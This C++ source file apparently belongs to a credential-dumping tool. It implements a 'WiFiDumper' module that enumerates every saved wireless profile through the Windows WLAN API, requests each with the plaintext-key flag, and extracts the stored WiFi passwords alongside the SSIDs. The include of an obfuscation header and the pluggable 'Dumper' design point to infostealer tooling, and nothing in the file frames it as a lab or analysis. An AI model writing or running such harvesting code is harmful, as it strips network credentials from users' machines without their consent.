#include <windows.h>
#include <wlanapi.h>
#include <string>
#include <vector>
#include "dumper.h"
#include "obfuscate.h"

#pragma comment(lib, "wlanapi.lib")

// -------------------------------------------------------------------
// WiFi credentials dumper using WLAN API
// -------------------------------------------------------------------
class WiFiDumper : public Dumper {
public:
    virtual const wchar_t* Name() const override {
        return L"WiFi";
    }
    
    virtual std::vector<DumpResult> Dump() override {
        std::vector<DumpResult> results;
        
        HANDLE hClient = nullptr;
        DWORD dwMaxClient = 2;
        DWORD dwCurVersion = 0;
        DWORD dwResult = 0;
        
        // Open WLAN handle
        dwResult = WlanOpenHandle(dwMaxClient, nullptr, &dwCurVersion, &hClient);
        if (dwResult != ERROR_SUCCESS)
            return results;
        
        // Enumerate interfaces
        PWLAN_INTERFACE_INFO_LIST pIfList = nullptr;
        dwResult = WlanEnumInterfaces(hClient, nullptr, &pIfList);
        if (dwResult != ERROR_SUCCESS) {
            WlanCloseHandle(hClient, nullptr);
            return results;
        }
        
        for (DWORD i = 0; i < pIfList->dwNumberOfItems; ++i) {
            PWLAN_INTERFACE_INFO pIfInfo = &pIfList->InterfaceInfo[i];
            
            // Enumerate profiles for this interface
            PWLAN_PROFILE_INFO_LIST pProfileList = nullptr;
            dwResult = WlanGetProfileList(hClient, &pIfInfo->InterfaceGuid,
                                           nullptr, &pProfileList);
            if (dwResult != ERROR_SUCCESS)
                continue;
            
            for (DWORD j = 0; j < pProfileList->dwNumberOfItems; ++j) {
                PWLAN_PROFILE_INFO pProfile = &pProfileList->ProfileInfo[j];
                
                // Get profile XML with plaintext key
                DWORD dwFlags = WLAN_PROFILE_GET_PLAINTEXT_KEY;
                DWORD dwAccess = 0;
                DWORD dwErr = 0;
                wchar_t* pProfileXml = nullptr;
                
                dwErr = WlanGetProfile(hClient, &pIfInfo->InterfaceGuid,
                                        pProfile->strProfileName,
                                        nullptr, &pProfileXml,
                                        &dwFlags, &dwAccess);
                
                if (dwErr == ERROR_SUCCESS && pProfileXml) {
                    std::wstring xml(pProfileXml);
                    
                    // Extract SSID from profile name
                    std::wstring ssid = pProfile->strProfileName;
                    
                    // Extract keyMaterial from XML (simple parsing)
                    std::wstring keyMaterial;
                    size_t keyStart = xml.find(L"<keyMaterial>");
                    if (keyStart != std::wstring::npos) {
                        keyStart += 13; // length of <keyMaterial>
                        size_t keyEnd = xml.find(L"</keyMaterial>", keyStart);
                        if (keyEnd != std::wstring::npos) {
                            keyMaterial = xml.substr(keyStart, keyEnd - keyStart);
                        }
                    }
                    
                    std::wstring notes = L"Interface: ";
                    notes += pIfInfo->strInterfaceDescription;
                    
                    if (!keyMaterial.empty()) {
                        results.emplace_back(
                            L"WiFi",
                            ssid,
                            keyMaterial,
                            L"",
                            notes
                        );
                    } else {
                        // Profile exists but no key found
                        results.emplace_back(
                            L"WiFi",
                            ssid,
                            L"[KEY_NOT_EXTRACTABLE]",
                            L"",
                            notes + L" (key not extractable)"
                        );
                    }
                    
                    WlanFreeMemory(pProfileXml);
                }
            }
            
            if (pProfileList)
                WlanFreeMemory(pProfileList);
        }
        
        if (pIfList)
            WlanFreeMemory(pIfList);
        
        WlanCloseHandle(hClient, nullptr);
        
        return results;
    }
};
